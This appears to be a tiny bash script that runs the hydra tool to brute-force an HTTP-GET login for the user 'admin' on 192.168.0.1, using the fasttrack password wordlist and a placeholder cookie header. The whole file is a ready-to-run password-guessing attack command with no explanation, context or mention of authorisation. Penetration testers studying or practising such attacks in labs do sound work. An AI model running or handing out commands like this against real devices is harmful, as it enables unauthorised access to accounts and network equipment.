#!/bin/bash

hydra -l admin -P /usr/share/wordlists/fasttrack.txt -vV 192.168.0.1 http-get H=Cookie:NAME=VALUE

